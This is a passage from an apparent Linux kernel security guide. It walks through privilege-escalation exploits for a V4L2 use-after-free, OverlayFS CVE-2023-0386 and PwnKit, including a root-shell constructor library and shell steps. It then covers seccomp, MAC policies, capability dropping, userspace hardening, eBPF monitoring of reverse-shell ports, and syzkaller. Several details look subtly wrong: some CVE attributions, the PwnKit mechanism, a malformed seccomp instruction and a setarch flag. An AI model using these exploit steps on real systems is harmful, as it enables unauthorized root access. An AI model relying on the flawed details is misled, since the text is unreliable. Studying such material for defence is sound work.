ioctl(dev_fd, VIDIOC_REQBUFS, &req);

// 3. Queue a buffer
struct v4l2_buffer buf = { /* ... */ };
ioctl(dev_fd, VIDIOC_QBUF, &buf);

// 4. In another thread, immediately stream off
pthread_create(&tid, NULL, stream_off_thread, dev_fd);

// 5. The stream off frees the buffer while device_run still
//    holds a reference → UAF

// 6. Reclaim the freed slab object with msg_msg or setxattr
//    This allows controlling the freed memory

// 7. The dangling pointer in device_run now points to
//    attacker-controlled data → arbitrary R/W
```

**Post-UAF exploitation:**

```
UAF read  → Leak kernel heap address → Defeat KASLR
UAF write → Overwrite function pointer → RIP control
            → Stack pivot → ROP chain → commit_creds(prepare_kernel_cred(0))
```

**Fix:** Add proper locking and reference counting. Ensure `v4l2_m2m_streamoff()` waits for pending jobs to complete before freeing buffers. Use `v4l2_m2m_buf_remove()` under proper locks.

**Significance:** V4L2 and the media subsystem represent a massive attack surface due to complex state machines, numerous ioctl commands, and hardware-specific code paths. Race conditions in this subsystem are common because of the asynchronous nature of media processing.

---

### 3.4 CVE-2023-0386 — OverlayFS Setuid Copy-Up

**Vulnerability:** In overlayFS, when a file with setuid/setgid bits is copied up (from lower to upper layer), the capability checks were incomplete, allowing an unprivileged user to create a setuid binary.

**Affected Versions:** Linux 5.11 – 6.2 (fixed in 6.2-rc7)

**Root Cause:**

When overlayFS copies a file from the lower to the upper layer (a "copy up" operation), it must preserve file attributes including setuid/setgid bits. The vulnerability was that `ovl_copy_up_metadata()` didn't properly verify that the calling process had the right to create setuid files:

```c
// In fs/overlayfs/copy_up.c:

static int ovl_copy_up_metadata(struct ovl_copy_up_ctx *c)
{
    // ... copy xattrs, mode, etc.
    
    // BUG: When copying up a setuid file, the code preserves
    // the setuid bit without checking whether the task
    // has CAP_SETUID or CAP_FSETID in the user namespace
    
    // The check for keeping setuid bits was:
    if (c->stat.mode & S_ISUID)
        // Only cleared if the task lacks CAP_FSETID
        // AND the copy-up is triggered by write
        // BUT: copy-up can be triggered by other operations
        // like open() which bypassed this check
    
    // Result: A file with mode 04755 in the lower layer
    // gets copied to upper layer with mode 04755
    // even if the user isn't privileged
}
```

The specific exploitable path was through opening a setuid file in the overlay for writing, which triggered a copy-up that preserved the setuid bit even though the opener should have had the bit stripped.

**Exploitation Steps:**

```bash
# 1. Create overlayFS mount (user namespace with mount cap)
mount -t overlay overlay \
    -olowerdir=/lower,upperdir=/upper,workdir=/work \
    /merged

# 2. Place a setuid root binary in /lower
#    (e.g., a copy of /bin/sh with mode 04755)
cp /bin/sh /lower/rootshell
chmod 4755 /lower/rootshell

# 3. From an unprivileged user, trigger copy-up by writing to
#    the file in the merged view
echo "data" > /merged/rootshell

# 4. The file is now in /upper with setuid bits INTACT
#    despite the unprivileged write

# 5. Execute the setuid shell
/merged/rootshell -c "id"  # uid=0(root)
```

**Alternative trigger via open():**
```c
// Even opening the file for write triggers copy-up:
int fd = open("/merged/rootshell", O_WRONLY);
// The setuid bit should be stripped here (like on a regular FS)
// but overlayFS failed to do so
close(fd);

// Now /merged/rootshell is still setuid
```

**Fix:** Properly clear setuid/setgid bits during copy-up when the process lacks `CAP_FSETID`, matching the behavior of regular filesystems:

```c
// In ovl_copy_up_metadata(), add:
if (!capable(CAP_FSETID) && S_ISREG(stat->mode)) {
    // Strip setuid/setgid bits, matching VFS behavior
    stat->mode &= ~(S_ISUID | S_ISGID);
}
```

**Significance:** This demonstrates how filesystem stacking (overlayFS) introduces semantic gaps. The VFS layer properly strips setuid bits on write, but overlayFS's copy-up mechanism bypasses this VFS check. This class of bugs (privileged attribute preservation during copy-up) has recurred in overlayFS multiple times (CVE-2015-8660, CVE-2016-1240, CVE-2023-0386).

---

### 3.5 CVE-2021-4034 — "PwnKit" (polkit's pkexec)

**Vulnerability:** A local privilege escalation in `pkexec` (part of polkit) due to improper argument handling when called with no arguments, leading to out-of-bounds variable expansion and arbitrary file execution.

**Affected Versions:** polkit 0.100 – 0.120 (all versions since 2012, fixed in 0.120-patch)

**Root Cause:**

`pkexec` processes its command-line arguments but fails to handle the case where it's called with zero arguments properly:

```c
// In polkit/pkexec.c:

static gboolean
parse_args (int *argc, char **argv[])
{
    // ...
    for (n = 1; n < *argc; n++) {
        // Process arguments
    }
    // If called with no arguments, *argc == 1 (just "pkexec")
    // The code later assumes at least one argument exists
}

// Later in main():
// The code iterates over PATH environment variable to find program
// When argc == 1, argv[1] is NULL but code processes it

// CRITICAL: The environment variable processing path:
for (n = 1; n < *argc; n++) {
    if (strcmp((*argv)[n], "--user") == 0) {
        // ...
    }
}

// But more importantly, pkexec tries to find the program to execute:
g_strcmp0(argv[n], "-") == 0
// When argc==1 and n==1, this reads argv[1] which is NULL
// On some systems this becomes the envp pointer

// The key insight:
// On Linux, argv and envp are contiguous in memory:
//   [argv[0]] [argv[1]] ... [NULL] [envp[0]] [envp[1]] ... [NULL]
// When pkexec is called with no args, argv[1] is NULL,
// but the code attempts to process. Due to how the argument
// processing loop works with the string "-" comparison,
// argv[1] (which is NULL) causes the pointer to slide into envp.
```

The core issue is that `pkexec` processes `argv[1]` and beyond without checking if they exist when called with zero arguments. On systems where argv and envp are contiguous (glibc), this leads to treating environment variable entries as command-line arguments.

**Exploitation:**

```bash
# PwnKit exploit (simplified):

# 1. Create a shared library that will be loaded as a "GIO module"
cat > /tmp/gio.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
static __attribute__((constructor)) void pwn(void) {
    setuid(0); setgid(0);
    system("/bin/sh");
}
EOF
gcc -shared -fPIC -o /tmp/gio.so /tmp/gio.c

# 2. Set environment to exploit the argv/envp confusion
export GIO_MODULE_DIR=/tmp
export PATH=/tmp:...  # Make pkexec find our binary

# 3. Create a "GIO module directory" structure that causes pkexec
#    to dlopen() our shared library when it tries to find the
#    execution helper

# 4. Run pkexec with no arguments to trigger the bug
pkexec
# → Our constructor runs as root
```

**More precise exploitation mechanism:**

```c
// The actual exploit works by:
// 1. Setting environment variables that control GIO module loading
// 2. Calling pkexec with no arguments
// 3. pkexec slides from argv into envp due to the NULL argv bug
// 4. It interprets an envp entry as a program name
// 5. It searches PATH for this "program"
// 6. If the "program" is found, pkexec (running as root via SUID)
//    loads the GIO module from GIO_MODULE_DIR
// 7. GIO_MODULE_DIR contains our malicious .so
// 8. dlopen() loads and executes our code as root

// The actual POC uses:
//   - GIO_MODULE_DIR pointing to attacker-controlled directory
//   - A crafted .so that acts as a GIO module
//   - The argv/envp confusion causes pkexec to call
//     g_io_modules_load_all_in_directory() with attacker path
```

**Fixes:**

1. Check `argc` before accessing `argv[n]` for `n >= argc`
2. Set environment to a clean state before processing (clear all env vars)
3. CVE-2021-4034 fix validates that `argc >= 2` when processing args

**Significance:** PwnKit affected virtually every Linux distribution since 2012 and required no special privileges — just local access. It's a textbook example of:
- Memory layout assumptions (argv/envp contiguity)
- SUID binary argument parsing failures
- The risk of environment-variable-mediated attacks on privileged binaries
- The fact that a bug introduced in 2012 can persist for nearly a decade before discovery

---

## 4. Mitigations at Ring 3 Level

### 4.1 seccomp-bpf Filters

**seccomp** (secure computing) restricts the system calls a process can make. `seccomp-bpf` uses BPF programs to define allowed syscall policies.

#### 4.1.1 How It Works

```c
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <sys/prctl.h>

// Install a seccomp-bpf filter that only allows read, write, exit, rt_sigreturn
void install_seccomp_strict(void) {
    struct sock_filter filter[] = {
        // Load syscall number
        BPF_STMT(BPF_LD | BPF_W | BPF_ABS,
                 offsetof(struct seccomp_data, nr)),
        
        // Allow read
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_read, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        
        // Allow write
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_write, 0, 1),
        BPF_STMT(BPF_RET | BPF_RET, SECCOMP_RET_ALLOW),
        
        // Allow exit
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_exit, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        
        // Allow rt_sigreturn
        BPF_JUMP(BPF_JMP | BPF_JEQ | BPF_K, __NR_rt_sigreturn, 0, 1),
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_ALLOW),
        
        // Deny everything else
        BPF_STMT(BPF_RET | BPF_K, SECCOMP_RET_KILL_PROCESS),
    };
    
    struct sock_fprog prog = {
        .len = sizeof(filter) / sizeof(filter[0]),
        .filter = filter,
    };
    
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    prctl(PR_SET_SECCOMP, SECCOMP_SET_MODE_FILTER, &prog);
}
```

#### 4.1.2 seccomp-bpf Actions

| Action                          | Behavior                                                    |
|--------------------------------|-------------------------------------------------------------|
| `SECCOMP_RET_KILL_PROCESS`    | Kill the entire process immediately                         |
| `SECCOMP_RET_KILL_THREAD`    | Kill the calling thread                                      |
| `SECCOMP_RET_TRAP`            | Send SIGSYS to the process (can be caught for logging)     |
| `SECCOMP_RET_ERRNO`           | Return the specified errno to userspace                      |
| `SECCOMP_RET_TRACE`           | Notify ptrace tracer (for debugging)                        |
| `SECCOMP_RET_LOG`             | Log and allow (audit mode)                                  |
| `SECCOMP_RET_ALLOW`           | Allow the syscall                                           |

#### 4.1.3 Limitations

- **Cannot filter syscall content deeply:** BPF programs cannot dereference pointers, so filtering based on ioctl command codes or specific data values is limited.
- **TOCTOU:** syscall arguments are captured at entry, but user-space memory they point to can change between the filter check and the kernel's actual use.
- **Inflexible for complex applications:** Databases, browsers, and language runtimes need many syscalls.
- **Can be bypassed if not comprehensive:** If `process_vm_readv` or `ptrace` are allowed, a debugger can bypass the filter.

#### 4.1.4 Effective seccomp Profiles

```c
// Recommended minimal syscall whitelist for network services:
//   read, write, close, fstat, lseek, mmap, mprotect,
//   munmap, brk, rt_sigaction, rt_sigprocmask, ioctl,
//   access, pipe, select, mremap, madvise,
//   dup, dup2, pause, nanosleep, alarm, getpid,
//   sendfile, socket, connect, accept, sendto, recvfrom,
//   bind, listen, setsockopt, clone, exit, clock_gettime,
//   clock_getres, futex, epoll_wait, epoll_ctl, epoll_create,
//   sigaltstack, arch_prctl, getrandom, pread64, pwrite64

// Cloud-native example: container runtime seccomp profiles
// Docker default profile blocks ~44 syscalls including:
//   keyctl, add_key, request_key, bpf, clone (with CLONE_NEWUSER),
//   mount, pivot_root, ptrace (conditional), etc.
```

### 4.2 AppArmor / SELinux

#### 4.2.1 AppArmor

AppArmor uses path-based mandatory access control. Policies define what files, capabilities, and network accesses a confined process may use:

```bash
# Example AppArmor profile for a web server
abi <abi/4.0>,
#include <tunables/global>

profile webserver /usr/sbin/nginx {
    # File access
    /etc/nginx/** r,
    /var/log/nginx/** rw,
    /var/www/html/** r,
    /run/nginx.pid rw,
    
    # Network
    network inet tcp,
    network inet6 tcp,
    
    # Capabilities (minimal)
    capability net_bind_service,
    capability setgid,
    capability setuid,
    
    # Explicitly denied
    deny /etc/shadow r,
    deny capability sys_admin,
    deny capability sys_ptrace,
}
```

**AppArmor limitations against kernel exploits:**
- Path-based rules don't protect against kernel memory corruption (once Ring 0 code executes, AppArmor checks are bypassed)
- AppArmor primarily confines userspace behavior, not the kernel itself
- Effective for limiting _which_ attack surfaces are accessible (e.g., denying `/dev/mem` access)

#### 4.2.2 SELinux

SELinux uses label-based mandatory access control with fine-grained type enforcement:

```
# SELinux policy for a confined domain
type myapp_t;
type myapp_exec_t;
type myapp_data_t;

# Domain transition
domain_auto_trans(unconfined_t, myapp_exec_t, myapp_t)

# File access
allow myapp_t myapp_data_t:file { read write getattr open };
allow myapp_t etc_t:file { read getattr open };
allow myapp_t etc_t:dir { read search };

# Network
allow myapp_t self:tcp_socket { create connect read write };
allow myapp_t self:udp_socket { create connect read write };

# Capability restrictions
allow myapp_t self:capability { net_bind_service };
neverallow myapp_t self:capability { sys_admin sys_ptrace };
```

**SELinux vs kernel exploits:**

| Attack Vector              | SELinux Effective? | Reason                                          |
|---------------------------|---------------------|-------------------------------------------------|
| Direct device node access | Yes                 | Type enforcement blocks access                  |
| Kernel module loading     | Yes                 | Requires `insmod` domain transition             |
| /proc/kallsyms reading    | Yes                 | Requires `sysctl_kernel_t` label                |
| io_uring abuse            | Partial             | SELinux controls io_uring ops since 5.13        |
| Memory corruption exploit | No                  | Once code is Ring 0, MAC checks are bypassed    |
| eBPF program loading      | Yes                 | Requires `bpf` capability check                 |

### 4.3 Capability Dropping (libcap)

Linux capabilities partition root's power into discrete units. Dropping capabilities reduces the privilege surface:

```c
#include <linux/capability.h>
#include <sys/prctl.h>
#include <cap-ng.h>

void drop_privileges(void) {
    // 1. Set CAPS on the bounding set first (can only remove, not add)
    capng_clear(CAPNG_SELECT_BOTH);
    
    // 2. Add only needed capabilities
    capng_update(CAPNG_ADD, CAPNG_PERMITTED | CAPNG_EFFECTIVE,
                 CAP_NET_BIND_SERVICE);   // Bind to ports < 1024
    capng_update(CAPNG_ADD, CAPNG_PERMITTED | CAPNG_EFFECTIVE,
                 CAP_SETUID);              // Switch user (e.g., www-data)
    
    // 3. Apply the bounding set
    capng_apply(CAPNG_SELECT_BOUNDS);
    
    // 4. Set no-new-privs to prevent privilege escalation
    prctl(PR_SET_NO_NEW_PRIVS, 1, 0, 0, 0);
    
    // 5. Apply capability set changes
    capng_apply(CAPNG_SELECT_BOTH);
    
    // 6. Now switch to non-root user
    setuid(getuid());  // Or a dedicated service user
}
```

**Critical capabilities to drop for security:**

| Capability       | Risk if Retained                                         |
|-----------------|----------------------------------------------------------|
| CAP_SYS_ADMIN   | Near-root: mount, namespace, many ioctl operations       |
| CAP_SYS_MODULE  | Load kernel modules → arbitrary code execution           |
| CAP_SYS_PTRACE  | Inspect/modify any process memory                         |
| CAP_SYS_RAWIO   | Direct hardware access via /dev/mem, iopl                |
| CAP_SYS_BPF     | Load eBPF programs → potential kernel code exec          |
| CAP_DAC_OVERRIDE| Bypass all file permission checks                        |
| CAP_NET_ADMIN   | Network configuration, iptables, netlink access           |
| CAP_PERFMON     | perf_event_open → potential kernel data leak              |

### 4.4 Userspace Hardening: ASLR, PIE, RELRO, Stack Canaries

#### 4.4.1 ASLR (Address Space Layout Randomization)

ASLR randomizes the base addresses of the stack, heap, shared libraries, and (with PIE) the executable itself:

```bash
# Check ASLR status:
cat /proc/sys/kernel/randomize_va_space
# 0 = disabled
# 1 = partial (shared libs, stack)
# 2 = full (shared libs, stack, heap, PIE binaries)

# Force ASLR for a specific execution:
setarch $(uname -m) -R ./program       # Disable ASLR
setarch $(uname -m) -R ./program -3     # Force 32-bit (different randomization)
```

**ASLR effectiveness for userspace:**

| Region          | Randomization Bits | Entropy (x86-64)  | Entropy (x86-32) |
|----------------|-------------------|-------------------|-------------------|
| Stack          | Top of stack      | ~22 bits          | ~16 bits          |
| Heap (mmap)    | mmap base         | ~28 bits          | ~13 bits          |
| Libraries      | mmap area         | ~28 bits          | ~8 bits           |
| PIE executable | mmap base         | ~28 bits          | ~8 bits           |
| vDSO           | mmap area         | ~28 bits          | ~8 bits           |

**ASLR bypass (userspace):**
1. **Info leak:** Read a function pointer (GOT entry, vtable pointer) to calculate the library base address
2. **Partial overwrite:** Overwrite only the low bytes of a return address (requires 12 bits of brute force for cache line alignment)
3. **RET2PLT:** Call library functions via PLT without knowing exact addresses

#### 4.4.2 PIE (Position-Independent Executable)

```bash
# Compile with PIE:
gcc -pie -fPIE -o target target.c

# Check if binary is PIE:
readelf -h target | grep "Type:"
#   Type:  DYN (Position-Independent) → PIE enabled
#   Type:  EXEC → No PIE
```

PIE forces the executable to be loaded at a randomized address. Without PIE, the executable's `.text` section at a fixed address (typically `0x400000` on x86-64) provides a ROP gadget farm.

#### 4.4.3 RELRO (Relocation Read-Only)

```bash
# Full RELRO:
gcc -Wl,-z,relro,-z,now -o target target.c

# Check:
readelf -l target | grep RELRO
#   GNU_RELRO      → Partial RELRO
readelf -d target | grep BIND_NOW
#   FLAGS BIND_NOW → Full RELRO

# Partial RELRO: .got section is read-only but .got.plt is writable
# Full RELRO: .got.plt is merged into .got and marked read-only
#  - Prevents GOT overwrite attacks
#  - Tradeoff: slower startup (all relocations resolved at load time)
```

#### 4.4.4 Stack Canaries

```c
// GCC stack canary layout:
//   [buffer] [canary] [saved RBP] [return address]
//   
// The canary is a random value placed between locals and the saved return address.
// On function return, the canary is checked against the master canary
// (stored in the TCB at fs:0x28 / gs:0x28).
//
// Stack canary bypass techniques:
// 1. Leak the canary (info leak from format string or OOB read)
// 2. Overwrite a function pointer instead of the return address
// 3. Overwrite the master canary in TCB (if you have a write primitive)
// 4. Use a format string to write directly to the return address

// Compile with canaries:
gcc -fstack-protector-all -o target target.c

// Check for canaries:
objdump -d target | grep "__stack_chk_fail"
```

| GCC Flag                    | Protection Level                              |
|-----------------------------|-----------------------------------------------|
| `-fno-stack-protector`     | No canaries                                   |
| `-fstack-protector`        | Canaries for functions with char arrays >8B  |
| `-fstack-protector-strong` | Canaries for functions with any arrays/addr-taken |
| `-fstack-protector-all`    | Canaries for ALL functions                    |

### 4.5 eBPF for Runtime Monitoring

eBPF programs can monitor and enforce security policies at kernel checkpoints in real time:

#### 4.5.1 Syscall Monitoring

```c
// Trace all execve() calls for audit purposes
SEC("tracepoint/syscalls/sys_enter_execve")
int trace_execve(struct trace_event_raw_sys_enter *ctx) {
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 pid = pid_tgid >> 32;
    u32 tid = (u32)pid_tgid;
    
    struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;
    
    e->pid = pid;
    e->tid = tid;
    __builtin_memcpy(e->comm, comm, sizeof(comm));
    
    // Read filename argument
    const char *filename = (const char *)ctx->args[0];
    bpf_probe_read_user_str(e->filename, sizeof(e->filename), filename);
    
    bpf_ringbuf_submit(e, 0);
    return 0;
}
```

#### 4.5.2 Security Monitoring with BPF LSM

```c
// Block execution of specific binaries using BPF LSM
SEC("lsm/bprm_check_security")
int block_exec(struct linux_binprm *bprm) {
    char comm[16];
    bpf_get_current_comm(comm, sizeof(comm));
    
    // Block execution of dangerous binaries
    if (starts_with(bprm->filename, "/tmp/exploit"))
        return -EPERM;
    
    return 0;
}

// Monitor file open attempts on sensitive paths
SEC("lsm/file_open")
int monitor_file_open(struct file *file) {
    // Check if the file path matches a protected pattern
    // Log and potentially block
    return 0;
}
```

#### 4.5.3 Network Security Monitoring

```c
// Monitor all network connections
SEC("cgroup/connect4")
int monitor_connect4(struct bpf_sock_addr *ctx) {
    u32 dest_ip = ctx->user_ip4;
    u16 dest_port = ctx->user_port >> 16;
    
    // Alert on connections to suspicious IPs/ports
    if (dest_port == 4444) {  // Common reverse shell port
        struct event *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
        if (e) {
            e->type = ALERT_REVERSE_SHELL;
            e->pid = bpf_get_current_pid_tgid() >> 32;
            bpf_ringbuf_submit(e, 0);
        }
    }
    return 1;  // Allow the connection
}
```

#### 4.5.4 eBPF as Defense vs. Attack Surface

| Use Case               | eBPF Role                         | Considerations                               |
|------------------------|-----------------------------------|-----------------------------------------------|
| Syscall filtering      | LSM/tracepoint programs           | More flexible than seccomp                   |
| File access audit      | LSM/file_open hook                | Richer context than auditd                   |
| Network flow logging   | XDP/cgroup/connect hooks          | Covers all network activity                  |
| Process ancestry       | sched_process_fork/exit            | Detect process injection                     |
| **Attack surface**     | **eBPF itself is exploitable**   | **Verifier bugs → Ring 0 code exec**         |

**Warning:** The eBPF subsystem itself is a significant attack surface (see CVE-2021-4154 above). Running eBPF monitoring programs requires `CAP_BPF` or `CAP_SYS_ADMIN`. An attacker with these capabilities could load a malicious eBPF program.

Defense-in-depth recommendation: Use eBPF for monitoring but combine with seccomp-bpf for enforcement. Never rely solely on eBPF for security.

---

## 5. The Syscall Interface

### 5.1 How Syscalls Work

#### 5.1.1 The syscall/sysret Mechanism (x86-64)

On modern x86-64 Linux, system calls use the `syscall` instruction, which is the preferred (and fastest) method:

```asm
; User-space invocation:
;   mov rax, <syscall_number>    ; System call number (NR)
;   mov rdi, <arg1>               ; First argument
;   mov rsi, <arg2>               ; Second argument
;   mov rdx, <arg3>               ; Third argument
;   mov r10, <arg4>               ; Fourth argument (not rcx!)
;   mov r8,  <arg5>               ; Fifth argument
;   mov r9,  <arg6>               ; Sixth argument
;   syscall                        ; Trigger Ring 0 transition
;   ; Return: rax = return value, rdx = error status

; What syscall does (hardware):
;   1. Saves RIP to RCX (return address)
;   2. Saves RFLAGS to R11
;   3. Loads RIP from MSR_LSTAR (0xC0000082)
;   4. Loads CS from MSR_STAR (0xC0000081) → kernel CS
;   5. Sets CPL=0 (Ring 0)
;   6. Sets SS to kernel SS
;   7. Begins execution at entry_SYSCALL_64

; MSR_LSTAR points to entry_SYSCALL_64:
;   wrmsr(MSR_LSTAR, (u64)entry_SYSCALL_64);
;   wrmsr(MSR_STAR, ((u64)USER_CS32 << 48) | ((u64)KERNEL_CS << 32));
;   wrmsr(MSR_CSTAR, (u64)entry_SYSCALL_compat);
```

**The kernel entry path:**

```asm
; entry_SYSCALL_64 (arch/x86/entry/entry_64.S)
ENTRY(entry_SYSCALL_64)
    ; 1. Swap GS base (user GS → kernel GS)
    swapgs
    
    ; 2. Save user stack pointer
    movq    %rsp, %gs:cpu_tss_rw + TSS_sp2   ; Save user RSP
    
    ; 3. Load kernel stack
    movq    %gs:cpu_current_top_of_stack, %rsp
    
    ; 4. Construct pt_regs on kernel stack
    pushq   $__USER_DS                      ; SS
    pushq   %gs:cpu_tss_rw + TSS_sp2        ; SP (user RSP)
    pushq   %r11                            ; FLAGS (saved by syscall)
    pushq   $__USER_CS                      ; CS
    pushq   %rcx                            ; IP (saved by syscall)
    pushq   $-1                             ; orig_ax (no error code)
    
    ; 5. Save callee-saved registers
    pushq   %rdi; pushq %rsi; pushq %rdx
    pushq   %r8;  pushq %r9;  pushq %r10
    pushq   %rax  ; (saved syscall number)
    
    ; 6. Enable interrupts
    ENABLE_INTERRUPTS(CLBR_ANY)
    
    ; 7. Load current task pointer
    movq    %gs:cpu_current_task, %r11
    
    ; 8. Dispatch to syscall table
    movq    syscall_table(, %rax, 8), %rax
    call    *%rax
    
    ; 9. Return path: restore registers, swapgs, sysret
    ; ...
END(entry_SYSCALL_64)
```

#### 5.1.2 The int 0x80 Interface (Legacy)

The legacy 32-bit syscall interface uses software interrupt `int 0x80`:

```asm
; 32-bit syscall via int 0x80:
;   mov eax, <syscall_number>
;   mov ebx, <arg1>
;   mov ecx, <arg2>
;   mov edx, <arg3>
;   mov esi, <arg4>
;   mov edi, <arg5>
;   mov ebp, <arg6>
;   int 0x80
;   ; eax = return value

; The IDT entry for 0x80 points to entry_INT80_compat
; This is slower than syscall/sysret because:
; 1. Full register save/restore (not optimized like syscall)
; 2. Switches to 32-bit compatibility mode
; 3. Only 5 argument registers (ebx, ecx, edx, esi, edi, ebp)
```

#### 5.1.3 The Syscall Table

```c
// arch/x86/entry/syscalls/syscall_64.tbl
// Format: <number> <abi> <name> <entry_point>

0   common  read            sys_read
1   common  write           sys_write
2   common  open            sys_open
3   common  close           sys_close
...
318 common  io_uring_setup  sys_io_uring_setup
319 common  io_uring_enter  sys_io_uring_enter
320 common  io_uring_register sys_io_uring_register
...
443 common  map_shadow_stack sys_map_shadow_stack
444 common  futex_waitv     sys_futex_waitv
445 common  set_mempolicy_home_node sys_set_mempolicy_home_node

// The dispatch table:
const sys_call_ptr_t sys_call_table[__NR_syscalls] = {
    [0] = sys_read,
    [1] = sys_write,
    // ...
};

// Attack surface: ANY syscall entry in this table is reachable
// from Ring 3 unless explicitly blocked by seccomp.
// As of Linux 6.x, there are ~450 syscall entries.
```

### 5.2 Syscall Fuzzing with syzkaller

[syzkaller](https://github.com/google/syzkaller) is the primary syscall fuzzer for the Linux kernel, responsible for finding thousands of bugs.

#### 5.2.1 Architecture

```
┌─────────────────────────────────────────────────┐
│                  syzkaller                         │
│                                                   │
│  ┌──────────────┐  ┌───────────────────────────┐ │
│  │  syz-fuzzer  │  │  syz-manager              │ │
│  │  (per-VM)    │  │  (orchestration, web UI)  │ │
│  └──────┬───────┘  └───────────────────────────┘ │
│         │                                         │
│  ┌──────▼───────┐                                │
│  │ Coverage-guided fuzzing engine                │ │
│  │ (evolutionary,timestamp-based)                │ │
│  └──────┬───────┘                                │
│         │                                         │
│  ┌──────▼───────┐                                │
│  │  System call descriptions                     │ │
│  │  (sys/linux/*.txt in syzkaller)               │ │
│  │  Declares syscall interfaces, structs,         │ │
│  │  const values, size ranges, etc.             │ │
│  └──────┬───────┘                                │
│         │                                         │
└─────────┼─────────────────────────────────────────┘
          │
    ┌─────▼─────┐
    │  QEMU VM  │  (Boots kernel with coverage enabled)
    │           │
    │ ┌───────┐ │
    │ │syz-   │ │  (Executes syscall sequences)
    │ │executor│ │
    │ └───────┘ │
    │           │
    │  Kernel   │  (CONFIG_KCOV, CONFIG_KASAN, CONFIG_UBSAN)
    │  under    │
    │  test    │
    │           │
    └───────────┘
```

#### 5.2.2 Syscall Description Language

syzkaller uses a declarative language to describe syscall interfaces:

```
# Example: describing ioctl interfaces for fuzzing

openat$netlink(fd const[AT_FDCWD], file ptr[in, string["netlink"]], \
    flags flags[open_flags], mode flags[open_mode]) file

socket$netlink(domain const[AF_NETLINK], type flags[socket_type], \
    proto const[NETLINK_ROUTE]) sock

# v4l2 ioctl descriptions (enormous attack surface)
ioctl$VIDIOC_QUERYCAP(fd fd, cmd const[VIDIOC_QUERYCAP], \
    arg ptr[out, v4l2_capability])

ioctl$VIDIOC_S_FMT(fd fd, cmd const[VIDIOC_S_FMT], \
    arg ptr[inout, v4l2_format])

# Struct definitions for fuzzing
v4l2_format {
    type   const[V4L2_BUF_TYPE_VIDEO_CAPTURE, int32]
    fmt    union[v4l2_pix_format, v4l2_pix_format_mplane, ...]
}

v4l2_pix_format {
    width      range[0, 16384]
    height     range[0, 16384]
    pixelformat flags[v4l2_pixel_formats]
    field      flags[v4l2_fields]
    bytesperline range[0, 0xffffffff]
    sizeimage  range[0, 0xffffffff]
}
```

#### 5.2.3 Coverage-Guided Fuzzing

```c
// syzkaller uses KCov for kernel coverage:
// 1. Kernel is compiled with CONFIG_KCOV
// 2. The fuzzer opens /sys/kernel/debug/kcov
// 3. Before each syscall, coverage is enabled:
//    ioctl(kcov_fd, KCOV_ENABLE, KCOV_TRACE_PC);
// 4. After the syscall, coverage is read:
//    ioctl(kcov_fd, KCOV_DISABLE, 0);
// 5. Coverage map guides mutation (new PCs → new inputs)

// This allows syzkaller to:
// - Discover new code paths in syscall handlers
// - Prioritize inputs that reach deep into subsystems
// - Automatically minimize crash reproducers
// - Report crashes with KASAN/KMSAN/KCSAN annotations
```

#### 5.2.4 Notable Vulnerabilities Found by syzkaller

| Year | Bug                      | Subsystem          | Severity       |
|------|--------------------------|--------------------|-----------------|
| 2016 | CVE-2016-0728            | keyctl             | Local LPE       |
| 2017 | CVE-2017-7308            | packet_set_ring    | Local LPE       |
| 2018 | CVE-2018-10675           | floppy driver      | DoS/Info leak   |
| 2019 | CVE-2019-18683           | v4l2-m2m           | Local LPE       |
| 2020 | CVE-2020-14333           | eBPF verifier      | Local LPE       |
| 2021 | CVE-2021-3715            | eBPF verifier      | Local LPE       |
| 2022 | Multiple io_uring bugs  | io_uring           | LPE/DoS         |
| 2023 | Various BPF bugs         | bpf verifier       | LPE             |

### 5.3 Historical Syscall Bugs

#### 5.3.1 CVE-2016-0728 — keyctl Reference Count Overflow

**Vulnerability:** Integer overflow in `keyctl_join_session_keyring()` leading to use-after-free.

```c
// In security/keys/keyctl.c:
long keyctl_join_session_keyring(const char __user *_name) {
    // The reference count on the old session keyring was put
    // and a new reference was taken without proper locking
    // When the refcount overflowed (from INT_MAX to 0), 
    // the keyring was freed while still referenced
    
    // Exploit: call keyctl_join_session_keyring() ~2^32 times
    // to overflow the reference count from INT_MAX to 0
    // Then trigger keyring freeing and reclaim with controlled data
}
```

**Impact:** Local privilege escalation; required ~2^32 `keyctl` calls (~32 hours on 2016 hardware, faster with optimizations).

#### 5.3.2 CVE-2017-7308 — packet_set_ring Arithmetic Overflow

**Vulnerability:** Integer overflow in `packet_set_ring()` (AF_PACKET) allowing heap overflow.

```c
// In net/packet/af_packet.c:
static int packet_set_ring(struct sock *sk, union tpacket_req_u *req_u,
                           int closing, int tx_ring) {
    // When calculating block size:
    // req->tp_block_size * req->tp_block_nr could overflow
    // Leading to a smaller-than-expected allocation followed by
    // out-of-bounds write
    
    // The check was:
    if (req->tp_block_size < PAGE_SIZE ||
        req->tp_block_size > PAGE_SIZE * 8)
        return -EINVAL; // But didn't check multiplication overflow
    
    // Exploit: Set tp_block_size = PAGE_SIZE, tp_block_nr = large value
    // The allocated ring buffer is smaller than expected
    // Then write past the allocation boundary
}
```

**Impact:** Local privilege escalation; required `CAP_NET_RAW` but this is granted to unprivileged users in many container setups.

#### 5.3.3 CVE-2019-11479 — TCP SACK Resource Exhaustion

**Vulnerability:** Processing of TCP SACK (Selective Acknowledgment) blocks could cause excessive resource consumption.

```c
// In net/ipv4/tcp_input.c:
// When processing a series of small SACK blocks,
// the kernel created a large number of separate SKB fragments
// each requiring separate processing. This could be triggered
// by a remote attacker sending carefully crafted TCP packets
// with many small SACK blocks, causing:
// - Excessive memory fragmentation
// - O(n^2) processing in tcp_sacktag_walk()
// - DDoS condition (connection stalling)
```

**Impact:** Remote denial of service; mitigated by limiting SACK block processing.

#### 5.3.4 CVE-2020-2555 — io_uring CQ Overflow

**Vulnerability:** Race condition in io_uring completion queue handling leading to memory corruption.

```c
